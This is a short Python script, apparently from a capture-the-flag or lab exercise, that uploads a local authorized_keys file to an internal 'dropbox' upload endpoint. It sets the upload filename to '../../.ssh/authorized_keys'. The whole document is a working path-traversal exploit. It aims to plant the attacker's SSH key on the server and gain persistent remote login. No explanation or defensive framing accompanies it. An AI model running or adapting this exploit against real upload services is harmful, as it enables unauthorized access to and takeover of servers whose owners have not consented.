import requests

url = "https://dropbox.internal.regjeringen.uiaikt.no/"

key_file = {
    "file": ("../../.ssh/authorized_keys", open("./authorized_keys", "rb")),
}

response = requests.post(url, files=key_file)

print(response.text)
